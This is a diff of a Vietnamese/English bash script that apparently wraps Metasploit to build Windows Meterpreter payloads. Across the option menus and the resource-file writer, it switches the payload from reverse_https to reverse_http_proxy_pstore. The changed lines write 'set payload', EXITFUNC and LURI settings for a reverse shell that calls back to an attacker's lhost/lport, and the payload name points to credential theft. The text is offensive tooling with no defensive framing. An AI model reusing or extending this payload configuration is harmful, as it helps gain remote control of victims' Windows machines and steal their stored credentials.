@@ -140,7 +140,7 @@ if [ "$language" = "VN" ]; then
 yes="     Có   "
 no="     Không "
 cat << !
-Các tùy chọn của tải trọng (windows/meterpreter/reverse_https):
+Các tùy chọn của tải trọng (windows/meterpreter/reverse_http_proxy_pstore):
 
    Tên            Thiết lập hiện tại    Yêu cầu   Miêu tả
    ----           ----------------      --------  -----------
@@ -153,7 +153,7 @@ elif [ "$language" = "EN" ]; then
 yes="     yes"
 no="     no "
 cat << !
-Payload options (windows/meterpreter/reverse_https):
+Payload options (windows/meterpreter/reverse_http_proxy_pstore):
 
    Name           Current Setting       Required  Description
    ----           ---------------       --------  -----------
@@ -170,7 +170,7 @@ if [ "$language" = "VN" ]; then
 yes="   Có  "
 no="   Không "
 cat << !
-Các tùy chọn của tải trọng (windows/meterpreter/reverse_https):
+Các tùy chọn của tải trọng (windows/meterpreter/reverse_http_proxy_pstore):
 
    Tên            Thiết lập hiện tại	       Yêu cầu    Miêu tả
    ----      	  ---------------  	       --------  -----------
@@ -184,7 +184,7 @@ elif [ "$language" = "EN" ]; then
 yes="   yes"
 no="   no "
 cat << !
-Payload options (windows/meterpreter/reverse_https):
+Payload options (windows/meterpreter/reverse_http_proxy_pstore):
 
    Name           Current Setting  	       Required  Description
    ----           ---------------  	       --------  -----------
@@ -201,10 +201,10 @@ payload_path_present=`pwd`
 payload_path_rc_file="$payload_path_present/Config"
 rc_file="$payload_path_rc_file/file.rc"
 config_file="$payload_path_present/Config/config"
-	echo "set payload windows/meterpreter/reverse_https" >> $rc_file
+	echo "set payload windows/meterpreter/reverse_http_proxy_pstore" >> $rc_file
 	echo "set EXITFUNC $exitfunc" >> $rc_file
 	echo "set LURI $luri" >> $rc_file
-	paylo="windows/meterpreter/reverse_https"
+	paylo="windows/meterpreter/reverse_http_proxy_pstore"
 	lhost=$lhost
 	lport=$lport
 }
